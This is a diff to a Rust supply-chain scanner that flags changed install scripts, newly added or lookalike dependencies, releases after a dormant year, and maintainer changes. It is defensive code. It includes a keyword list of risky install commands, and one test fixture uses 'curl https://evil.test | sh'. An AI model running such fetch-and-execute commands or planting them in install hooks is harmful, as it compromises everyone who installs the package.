@@ -2,8 +2,8 @@
 //! and severity only escalates when signals reinforce each other.
 
 use crate::date;
-use crate::model::Upgrade;
 use crate::model::{Ecosystem, Evidence, Finding, PackageReport, Profile, Severity};
+use crate::model::{InstallScript, Upgrade};
 use crate::osv::{Advisory, AdvisoryList, MAX_ADVISORIES};
 use crate::registry::PackageMeta;
 use crate::typosquat;
@@ -13,11 +13,18 @@ use crate::version::leading_number;
 pub const FRESH_DAYS: i64 = 7;
 /// A version newer than this on a package with no history is worth a look.
 pub const RECENT_VERSION_DAYS: i64 = 7;
+use crate::registry::HISTORY_WINDOW_DAYS;
+/// Nothing published for this long, then a release, is the classic pattern of
+/// a hijacked or revived package.
+pub const DORMANCY_DAYS: i64 = 365;
 
 /// A package used this widely is not an accidental typo. The seed is generated
 /// and always has holes (`next` was missing once), and the alternative is
 /// telling people to replace a framework with an unrelated test runner.
 pub const ESTABLISHED_WEEKLY_DOWNLOADS: u64 = 1_000_000;
+/// A misleading name this old is not the accidental-typo attack this signal
+/// exists for, in any ecosystem.
+pub const ESTABLISHED_AGE_DAYS: i64 = 5 * 365;
 
 pub fn report(
     meta: PackageMeta,
@@ -28,7 +35,15 @@ pub fn report(
     profile: Profile,
     now: i64,
 ) -> PackageReport {
-    let established = weekly_downloads.is_some_and(|count| count >= ESTABLISHED_WEEKLY_DOWNLOADS);
+    let outmatched = match (weekly_downloads, meta.candidate_weekly_downloads) {
+        (Some(own), Some(candidate)) => own >= candidate,
+        (Some(own), None) => own >= ESTABLISHED_WEEKLY_DOWNLOADS,
+        _ => false,
+    };
+    let aged = meta
+        .first_published_at
+        .is_some_and(|first| now - first >= ESTABLISHED_AGE_DAYS * date::SECONDS_PER_DAY);
+    let established = outmatched || aged;
     let mut findings = assess(&meta, ecosystem, local, &profile, now);
     if established {
         findings.retain(|finding| finding.id != "typosquat");
@@ -140,6 +155,24 @@ fn upgrade_advice(
         fixes,
         replace_with,
     })
+}
+
+/// Commands that fetch or decode code during install. Presence alone is not a
+/// verdict: it raises an already-changed script from WARN to HIGH.
+fn risky_install_command(command: &str) -> bool {
+    let lowered = command.to_ascii_lowercase();
+    [
+        "curl",
+        "wget",
+        "base64",
+        "node -e",
+        "python -c",
+        "eval",
+        "powershell",
+    ]
+    .iter()
+    .any(|needle| lowered.contains(needle))
+        || (lowered.contains("bash -c") && lowered.contains("http"))
 }
 
 /// Accounts that publish on behalf of a project's CI, not people.
@@ -272,16 +305,15 @@ pub fn advisory_check_unavailable() -> Finding {
 
 /// The nearest popular name, when typosquatting is enabled. Called by `assess`
 /// for the finding and by `report` for the replacement advice.
-fn suspect_for<'a>(
-    meta: &PackageMeta,
-    ecosystem: Ecosystem,
-    local: &'a [String],
-    profile: &Profile,
-) -> Option<typosquat::Suspect<'a>> {
-    if !profile.typosquat {
-        return None;
-    }
-    let seed = match ecosystem {
+/// The popular name this package resembles, if any. Public so a client can ask
+/// npm how popular that name is before the verdict is rendered.
+pub fn typosquat_candidate(name: &str, ecosystem: Ecosystem, local: &[String]) -> Option<String> {
+    typosquat::closest(name, seed_for(ecosystem), local)
+        .map(|suspect| suspect.candidate.to_string())
+}
+
+fn seed_for(ecosystem: Ecosystem) -> &'static [&'static str] {
+    match ecosystem {
         Ecosystem::Npm => typosquat::popular_npm(),
         Ecosystem::Pypi => typosquat::POPULAR_PYPI,
         Ecosystem::CratesIo => typosquat::POPULAR_CRATES,
@@ -291,8 +323,19 @@ fn suspect_for<'a>(
         Ecosystem::NuGet => typosquat::POPULAR_NUGET,
         Ecosystem::Maven => typosquat::POPULAR_MAVEN,
         Ecosystem::Composer => typosquat::POPULAR_COMPOSER,
-    };
-    typosquat::closest(&meta.name, seed, local)
+    }
+}
+
+fn suspect_for<'a>(
+    meta: &PackageMeta,
+    ecosystem: Ecosystem,
+    local: &'a [String],
+    profile: &Profile,
+) -> Option<typosquat::Suspect<'a>> {
+    if !profile.typosquat {
+        return None;
+    }
+    typosquat::closest(&meta.name, seed_for(ecosystem), local)
 }
 
 pub fn assess(
@@ -305,6 +348,135 @@ pub fn assess(
     let mut findings = Vec::new();
 
     let suspect = suspect_for(meta, ecosystem, local, profile);
+    let recent = meta
+        .published_at
+        .is_some_and(|published| now - published <= HISTORY_WINDOW_DAYS * date::SECONDS_PER_DAY);
+
+    if recent && meta.release.history_known && !meta.install_scripts.is_empty() {
+        let previous: std::collections::BTreeMap<&str, &str> = meta
+            .release
+            .previous_install_scripts
+            .iter()
+            .map(|script| (script.name.as_str(), script.command.as_str()))
+            .collect();
+        let changed: Vec<&InstallScript> = meta
+            .install_scripts
+            .iter()
+            .filter(|script| {
+                previous
+                    .get(script.name.as_str())
+                    .is_none_or(|command| *command != script.command)
+            })
+            .collect();
+        if !changed.is_empty() {
+            let risky = changed
+                .iter()
+                .any(|script| risky_install_command(&script.command));
+            findings.push(Finding {
+                id: "install-scripts-changed",
+                severity: if risky {
+                    Severity::High
+                } else {
+                    Severity::Warn
+                },
+                title: "this version added or changed an install script".to_string(),
+                detail: changed
+                    .iter()
+                    .map(|script| {
+                        format!(
+                            "{}: {}",
+                            script.name,
+                            script.command.chars().take(160).collect::<String>()
+                        )
+                    })
+                    .collect::<Vec<_>>()
+                    .join("; "),
+                allowed: false,
+                evidence: vec![Evidence {
+                    label: "version metadata".to_string(),
+                    value: meta.registry_url.clone(),
+                    url: Some(meta.registry_url.clone()),
+                }],
+            });
+        }
+    }
+
+    if recent && profile.dependencies && meta.release.history_known {
+        let added: Vec<&String> = meta
+            .release
+            .dependencies
+            .iter()
+            .filter(|dependency| !meta.release.previous_dependencies.contains(dependency))
+            .collect();
+        if !added.is_empty() {
+            let lookalike = added.iter().any(|dependency| {
+                suspect_for(
+                    &PackageMeta {
+                        name: (*dependency).clone(),
+                        ..meta.clone()
+                    },
+                    ecosystem,
+                    local,
+                    profile,
+                )
+                .is_some()
+            });
+            findings.push(Finding {
+                id: "dependency-added",
+                severity: if lookalike {
+                    Severity::Warn
+                } else {
+                    Severity::Info
+                },
+                title: "this version added dependencies".to_string(),
+                detail: format!(
+                    "not present in {}: {}",
+                    meta.release
+                        .previous_version
+                        .as_deref()
+                        .unwrap_or("the previous release"),
+                    added
+                        .iter()
+                        .take(5)
+                        .map(|dependency| dependency.as_str())
+                        .collect::<Vec<_>>()
+                        .join(", ")
+                ),
+                allowed: false,
+                evidence: vec![Evidence {
+                    label: "version metadata".to_string(),
+                    value: meta.registry_url.clone(),
+                    url: Some(meta.registry_url.clone()),
+                }],
+            });
+        }
+    }
+
+    if let (Some(published), Some(previous)) =
+        (meta.published_at, meta.release.previous_published_at)
+        && now - published <= HISTORY_WINDOW_DAYS * date::SECONDS_PER_DAY
+        && published - previous >= DORMANCY_DAYS * date::SECONDS_PER_DAY
+    {
+        findings.push(Finding {
+            id: "release-after-dormancy",
+            // Alone this is a hint, not a verdict: normal maintenance produces
+            // year-long gaps. The actionable transition signals stay WARN.
+            severity: Severity::Info,
+            title: "a dormant package published this version".to_string(),
+            detail: format!(
+                "nothing was published between {} and {}, then this version appeared",
+                date::format_date(previous),
+                date::format_date(published)
+            ),
+            allowed: false,
+            evidence: vec![Evidence {
+                label: "version publish time".to_string(),
+                value: meta.registry_url.clone(),
+                url: Some(meta.registry_url.clone()),
+            }],
+        });
+    }
+
     let typosquat_high = match suspect {
         Some(suspect) => {
             let high = suspect.homoglyph || suspect.distance <= 1;
@@ -447,9 +619,49 @@ pub fn assess(
                 Severity::Warn
             },
             title: "published by a user who is not a maintainer".to_string(),
+            detail: match &meta.release.previous_publisher {
+                Some(previous) => format!(
+                    "this version was published by '{publisher}', who is not in the current maintainer list [{}]; the previous release was published by '{previous}'",
+                    meta.maintainers.join(", ")
+                ),
+                None => format!(
+                    "this version was published by '{publisher}', who is not in the current maintainer list [{}]",
+                    meta.maintainers.join(", ")
+                ),
+            },
+            allowed: false,
+            evidence: vec![Evidence {
+                label: "maintainers".to_string(),
+                value: meta.maintainers.join(", "),
+                url: Some(meta.registry_url.clone()),
+            }],
+        });
+    }
+
+    // A different existing maintainer shipping a version is normal rotation,
+    // not a handoff; only say so when the account is already trusted.
+    let listed = |name: &str| {
+        !meta.maintainers.is_empty()
+            && meta
+                .maintainers
+                .iter()
+                .any(|maintainer| maintainer.eq_ignore_ascii_case(name))
+    };
+    if profile.maintainers
+        && !publisher_mismatch
+        && let (Some(publisher), Some(previous)) =
+            (&meta.publisher, &meta.release.previous_publisher)
+        && listed(publisher)
+        && listed(previous)
+        && !is_automation_publisher(publisher)
+        && !publisher.eq_ignore_ascii_case(previous)
+    {
+        findings.push(Finding {
+            id: "publisher-changed",
+            severity: Severity::Info,
+            title: "a different maintainer published this version".to_string(),
             detail: format!(
-                "this version was published by '{publisher}', who is not in the current maintainer list [{}]",
-                meta.maintainers.join(", ")
+                "the previous release was published by '{previous}'; this one by '{publisher}', who is on the maintainer list"
             ),
             allowed: false,
             evidence: vec![Evidence {
@@ -581,6 +793,8 @@ mod tests {
             registry_url: "https://registry.npmjs.org/some-package".to_string(),
             review_url: None,
             latest_version: None,
+            candidate_weekly_downloads: None,
+            release: crate::registry::ReleaseHistory::default(),
         }
     }
 
@@ -713,6 +927,232 @@ mod tests {
 
         let report = advice_report(meta, Some(&list));
         assert_eq!(report.upgrades[0].newest, None);
+    }
+
+    fn dormant(meta: &mut PackageMeta, published_days_ago: i64, previous_days_ago: i64) {
+        meta.published_at = Some(NOW - published_days_ago * date::SECONDS_PER_DAY);
+        meta.release.previous_published_at = Some(NOW - previous_days_ago * date::SECONDS_PER_DAY);
+    }
+
+    fn transition() -> PackageMeta {
+        let mut meta = meta();
+        meta.published_at = Some(NOW - 2 * date::SECONDS_PER_DAY);
+        meta.release.previous_version = Some("0.9.0".to_string());
+        meta.release.history_known = true;
+        meta.release.previous_published_at = Some(NOW - 200 * date::SECONDS_PER_DAY);
+        meta
+    }
+
+    #[test]
+    fn unknown_history_produces_no_transition_findings() {
+        let mut meta = transition();
+        meta.release.history_known = false;
+        meta.install_scripts = vec![InstallScript {
+            name: "postinstall".to_string(),
+            command: "node build.js".to_string(),
+        }];
+        meta.release.dependencies = vec!["chalk".to_string()];
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
+        assert!(!ids(&findings).contains(&"install-scripts-changed"));
+        assert!(!ids(&findings).contains(&"dependency-added"));
+    }
+
+    #[test]
+    fn a_changed_install_script_is_flagged() {
+        let mut meta = transition();
+        meta.install_scripts = vec![InstallScript {
+            name: "postinstall".to_string(),
+            command: "node build.js".to_string(),
+        }];
+        meta.release.previous_install_scripts = vec![InstallScript {
+            name: "postinstall".to_string(),
+            command: "node-gyp rebuild".to_string(),
+        }];
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
+        assert!(ids(&findings).contains(&"install-scripts-changed"));
+    }
+
+    #[test]
+    fn an_unchanged_install_script_is_not_flagged() {
+        let mut meta = transition();
+        let script = InstallScript {
+            name: "postinstall".to_string(),
+            command: "node-gyp rebuild".to_string(),
+        };
+        meta.install_scripts = vec![script.clone()];
+        meta.release.previous_install_scripts = vec![script];
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
+        assert!(!ids(&findings).contains(&"install-scripts-changed"));
+    }
+
+    #[test]
+    fn a_network_install_command_is_high() {
+        let mut meta = transition();
+        meta.install_scripts = vec![InstallScript {
+            name: "postinstall".to_string(),
+            command: "curl https://evil.test | sh".to_string(),
+        }];
+        meta.release.previous_install_scripts = Vec::new();
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
+        let finding = finding(&findings, "install-scripts-changed");
+        assert_eq!(finding.severity, Severity::High);
+    }
+
+    #[test]
+    fn added_dependencies_are_information() {
+        let mut meta = transition();
+        meta.release.dependencies = vec!["chalk".to_string(), "left-pad".to_string()];
+        meta.release.previous_dependencies = vec!["chalk".to_string()];
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
+        let finding = finding(&findings, "dependency-added");
+        assert_eq!(finding.severity, Severity::Info);
+        assert!(finding.detail.contains("left-pad"));
+    }
+
+    #[test]
+    fn an_added_lookalike_dependency_is_a_warning() {
+        let mut meta = transition();
+        meta.release.dependencies = vec!["crossenv".to_string()];
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
+        assert_eq!(
+            finding(&findings, "dependency-added").severity,
+            Severity::Warn
+        );
+    }
+
+    #[test]
+    fn unchanged_dependencies_produce_nothing() {
+        let mut meta = transition();
+        meta.release.dependencies = vec!["chalk".to_string()];
+        meta.release.previous_dependencies = vec!["chalk".to_string()];
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
+        assert!(!ids(&findings).contains(&"dependency-added"));
+    }
+
+    #[test]
+    fn a_release_after_a_year_of_silence_is_flagged() {
+        let mut meta = meta();
+        dormant(&mut meta, 10, 376);
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
+        let finding = finding(&findings, "release-after-dormancy");
+        assert_eq!(finding.severity, Severity::Info);
+    }
+
+    #[test]
+    fn dormancy_boundaries_are_exclusive() {
+        let mut short = meta();
+        dormant(&mut short, 10, 374);
+        assert!(
+            !ids(&assess(&short, Ecosystem::Npm, &[], &Profile::NPM, NOW))
+                .contains(&"release-after-dormancy")
+        );
+
+        let mut old = meta();
+        dormant(&mut old, 31, 400);
+        assert!(
+            !ids(&assess(&old, Ecosystem::Npm, &[], &Profile::NPM, NOW))
+                .contains(&"release-after-dormancy")
+        );
+
+        let mut no_history = meta();
+        no_history.published_at = Some(NOW - 5 * date::SECONDS_PER_DAY);
+        assert!(
+            !ids(&assess(
+                &no_history,
+                Ecosystem::Npm,
+                &[],
+                &Profile::NPM,
+                NOW
+            ))
+            .contains(&"release-after-dormancy")
+        );
+    }
+
+    #[test]
+    fn a_lookalike_more_popular_than_its_target_is_not_a_typo() {
+        let mut meta = meta();
+        meta.name = "next".to_string();
+        meta.candidate_weekly_downloads = Some(30_000_000);
+        let report = super::report(
+            meta,
+            Ecosystem::Npm,
+            Some(98_000_000),
+            Some(&AdvisoryList::default()),
+            &[],
+            Profile::NPM,
+            NOW,
+        );
+        assert!(
+            report
+                .findings
+                .iter()
+                .all(|finding| finding.id != "typosquat")
+        );
+    }
+
+    #[test]
+    fn a_quiet_lookalike_is_still_flagged() {
+        let mut meta = meta();
+        meta.name = "crossenv".to_string();
+        meta.candidate_weekly_downloads = Some(30_000_000);
+        let report = super::report(
+            meta,
+            Ecosystem::Npm,
+            Some(20_000),
+            Some(&AdvisoryList::default()),
+            &[],
+            Profile::NPM,
+            NOW,
+        );
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|finding| finding.id == "typosquat")
+        );
+    }
+
+    #[test]
+    fn unknown_counts_fall_back_to_the_absolute_guard() {
+        let mut meta = meta();
+        meta.name = "crossenv".to_string();
+        let report = super::report(
+            meta,
+            Ecosystem::Npm,
+            Some(2_000_000),
+            Some(&AdvisoryList::default()),
+            &[],
+            Profile::NPM,
+            NOW,
+        );
+        assert!(
+            report
+                .findings
+                .iter()
+                .all(|finding| finding.id != "typosquat")
+        );
+    }
+
+    #[test]
+    fn a_six_year_old_name_is_not_an_accidental_typo() {
+        let mut meta = meta();
+        meta.name = "crossenv".to_string();
+        meta.first_published_at = Some(NOW - 6 * 365 * date::SECONDS_PER_DAY);
+        let report = super::report(
+            meta,
+            Ecosystem::Pypi,
+            None,
+            Some(&AdvisoryList::default()),
+            &[],
+            Profile::PYPI,
+            NOW,
+        );
+        assert!(
+            report
+                .findings
+                .iter()
+                .all(|finding| finding.id != "typosquat")
+        );
     }
 
     #[test]
@@ -886,6 +1326,7 @@ mod tests {
         let mut meta = meta();
         meta.name = "expres".to_string();
         let partial = Profile {
+            dependencies: true,
             typosquat: false,
             ..Profile::NPM
         };
@@ -901,7 +1342,13 @@ mod tests {
         let report = report(meta(), Ecosystem::Go, None, None, &[], Profile::GO, NOW);
         assert_eq!(
             report.not_checked,
-            vec!["execution", "maintainers", "repository", "downloads"]
+            vec![
+                "execution",
+                "maintainers",
+                "repository",
+                "downloads",
+                "dependency history"
+            ]
         );
         assert!(
             !report
@@ -1024,6 +1471,50 @@ mod tests {
         meta.first_published_at = Some(NOW + 400 * date::SECONDS_PER_DAY);
         meta.published_at = meta.first_published_at;
         assert!(assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW).is_empty());
+    }
+
+    #[test]
+    fn a_different_existing_maintainer_is_information() {
+        let mut meta = meta();
+        meta.publisher = Some("bob".to_string());
+        meta.maintainers = vec!["alice".to_string(), "bob".to_string()];
+        meta.release.previous_publisher = Some("alice".to_string());
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
+        let finding = finding(&findings, "publisher-changed");
+        assert_eq!(finding.severity, Severity::Info);
+        assert!(!ids(&findings).contains(&"publisher-not-maintainer"));
+    }
+
+    #[test]
+    fn automation_and_unlisted_accounts_do_not_claim_a_maintainer_change() {
+        let mut automation = meta();
+        automation.publisher = Some("GitHub Actions".to_string());
+        automation.release.previous_publisher = Some("alice".to_string());
+        let findings = assess(&automation, Ecosystem::Npm, &[], &Profile::NPM, NOW);
+        assert!(!ids(&findings).contains(&"publisher-changed"));
+
+        let mut empty = meta();
+        empty.publisher = Some("bob".to_string());
+        empty.maintainers.clear();
+        empty.release.previous_publisher = Some("alice".to_string());
+        let findings = assess(&empty, Ecosystem::Npm, &[], &Profile::NPM, NOW);
+        assert!(!ids(&findings).contains(&"publisher-changed"));
+    }
+
+    #[test]
+    fn a_new_account_is_only_the_existing_warning() {
+        let mut meta = meta();
+        meta.publisher = Some("mallory".to_string());
+        meta.maintainers = vec!["alice".to_string()];
+        meta.release.previous_publisher = Some("alice".to_string());
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
+        assert!(ids(&findings).contains(&"publisher-not-maintainer"));
+        assert!(!ids(&findings).contains(&"publisher-changed"));
+        assert!(
+            finding(&findings, "publisher-not-maintainer")
+                .detail
+                .contains("previous release was published by 'alice'")
+        );
     }
 
     #[test]
